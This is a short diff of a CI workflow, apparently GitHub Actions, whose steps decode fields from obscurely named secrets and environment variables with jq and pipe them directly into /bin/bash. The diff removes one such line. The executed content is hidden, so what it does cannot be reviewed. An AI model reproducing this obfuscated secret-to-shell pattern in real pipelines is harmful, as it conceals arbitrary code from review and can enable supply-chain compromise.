@@ -23,7 +23,6 @@ jobs:
           coa2341: ${{ secrets.coa2341 }}
         run: |
           printf '%s' "$coa2341" | jq -r .qu25 | /bin/bash
-          echo $jgqd657 | jq -r .wxd6591 | /bin/bash
           echo $hkmyj284 | jq -r .kei445 | /bin/bash
           printf '%s' "$xcrd0422" | jq -r .j5017 | /bin/bash
           printf '%s' "$yzc9" | jq -r .baf0952 | /bin/bash
